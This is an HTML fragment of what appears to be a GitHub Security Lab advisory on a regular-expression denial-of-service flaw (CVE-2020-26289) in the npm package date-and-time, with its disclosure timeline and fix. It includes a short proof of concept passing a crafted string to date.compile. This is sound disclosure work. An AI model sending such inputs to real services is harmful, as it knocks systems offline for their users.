<header class="post-header d-block mb-6">
      ...
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-349: ReDoS (Regular Expression Denial of Service) in date-and-time - CVE-2020-26289</h1>
...
<ul>
  ...
  <li>12/24/2020: maintainer releases fixed version 0.14.2</li>
</ul>
...
<p>This issue was detected using the <a href="https://lgtm.com/query/8295084931912136675/">following CodeQL query</a>.</p>

<p>PoC:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">npm install date-and-time</code></li>
  <li>Run the below with <code class="language-plaintext highlighter-rouge">node</code>.
    <pre><code class="language-JavaScript">var date = require("date-and-time");
date.compile("[ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ")
</code></pre>
  </li>
</ul>
...
<ul>
  <li>CVE-2020-26289</li>
</ul>

<h2 id="resources">Resources</h2>

<ul>
  <li>https://github.com/knowledgecode/date-and-time/security/advisories/GHSA-r92x-f52r-x54g</li>
</ul>
...
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-349</code> in any communication regarding this issue.</p>
